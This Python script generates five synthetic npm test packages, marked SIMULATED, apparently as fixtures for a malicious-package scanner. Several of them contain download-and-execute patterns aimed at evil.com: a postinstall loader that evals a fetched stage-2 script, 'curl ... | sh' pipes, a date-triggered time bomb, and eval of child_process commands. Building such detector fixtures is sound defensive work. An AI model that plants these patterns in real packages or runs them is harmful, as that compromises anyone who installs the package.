"""
Generate 5 additional synthetic malicious test packages.
Each tests a NEW detection category added in Phase 2.
"""
import json
import os
import tarfile
from pathlib import Path

BASE = Path(__file__).resolve().parent / "malicious"
ARCHIVE = BASE / "archives"
ARCHIVE.mkdir(parents=True, exist_ok=True)


def _make_pkg(name, version, pkg_json, files):
    pkg_dir = BASE / name / "package"
    pkg_dir.mkdir(parents=True, exist_ok=True)
    pkg_json.setdefault("name", name)
    pkg_json.setdefault("version", version)
    (pkg_dir / "package.json").write_text(json.dumps(pkg_json, indent=2), encoding="utf-8")
    for fname, content in files.items():
        fpath = pkg_dir / fname
        fpath.parent.mkdir(parents=True, exist_ok=True)
        fpath.write_text(content, encoding="utf-8")
    tgz = ARCHIVE / f"{name}-{version}.tgz"
    with tarfile.open(str(tgz), "w:gz") as tar:
        tar.add(str(pkg_dir), arcname="package")
    return tgz


# 11. Template literal eval
_make_pkg("template-eval-pkg", "1.0.0", {
    "description": "Uses template literals with eval",
}, {
    "index.js": """
// SIMULATED: Template literal eval (T1059.007)
const cmd = 'whoami';
const result = eval(`require('child_process').execSync('${cmd}')`);

// Also new Function with template
const fn = new Function(`return require('os').hostname()`);

// setTimeout with template
setTimeout(`console.log('delayed execution')`, 1000);
""",
})

# 12. WebAssembly loader
_make_pkg("wasm-loader-pkg", "1.0.0", {
    "description": "Loads WebAssembly binary",
}, {
    "index.js": """
// SIMULATED: WebAssembly payload (T1027.002)
const fs = require('fs');
const path = require('path');

// Load wasm from file
const wasmBuffer = fs.readFileSync(path.join(__dirname, 'payload.wasm'));
const wasmModule = WebAssembly.instantiate(wasmBuffer, {});

// Also streaming
fetch('https://evil.com/module.wasm')
  .then(r => r.arrayBuffer())
  .then(bytes => WebAssembly.compile(bytes));
""",
    "payload.wasm": "FAKE_WASM_BINARY_CONTENT",
})

# 13. Multi-stage downloader
_make_pkg("multi-stage-pkg", "1.0.0", {
    "description": "Downloads and executes stage 2",
    "scripts": {"postinstall": "node loader.js"},
}, {
    "loader.js": """
// SIMULATED: Multi-stage attack (T1105)
const https = require('https');

// Pattern 1: HTTP get + eval response
https.get('https://evil.com/stage2.js', function(res) {
    let body = '';
    res.on('data', d => body += d);
    res.on('end', () => eval(body));
});

// Pattern 2: curl piped to shell
require('child_process').execSync('curl -s https://evil.com/payload | sh');
""",
})

# 14. Steganography payload
_make_pkg("stego-payload-pkg", "1.0.0", {
    "description": "Hides payload in image data",
}, {
    "index.js": """
// SIMULATED: Steganography (T1027.003)
const fs = require('fs');

// Read image file and extract hidden data
const imgData = fs.readFileSync('./icon.png');
const extracted = imgData.slice(100, 200);
const hidden = Buffer.from(extracted);

// Pixel-level extraction (canvas-style)
function extractLSB(imageData) {
    const bits = [];
    for (let i = 0; i < imageData.length; i += 4) {
        bits.push(imageData[i] & 0x01);  // LSB of red channel
    }
    return bits;
}

// getImageData pattern
const ctx = canvas.getContext('2d');
const pixels = ctx.getImageData(0, 0, width, height);
""",
    "icon.png": "FAKE_PNG_DATA",
})

# 15. Time-bomb package
_make_pkg("time-bomb-pkg", "1.0.0", {
    "description": "Activates payload after specific date",
}, {
    "index.js": """
// SIMULATED: Time-bomb (T1497.003)
const now = new Date();

// Only execute after a specific date
if (new Date() > new Date('2025-12-01')) {
    require('child_process').execSync('curl https://evil.com/activate | sh');
}

// Timestamp-based gate
if (Date.now() > 1735689600000) {
    eval('malicious_code()');
}

// Long setTimeout (60 second delay to evade sandbox timeouts)
setTimeout(function() {
    require('child_process').exec('whoami > /tmp/pwned');
}, 60000);
""",
})


# Summary
archives = sorted(ARCHIVE.glob("*.tgz"))
print(f"\nTotal archives: {len(archives)}\n")
for a in archives:
    print(f"  {a.name} ({a.stat().st_size} bytes)")
print()
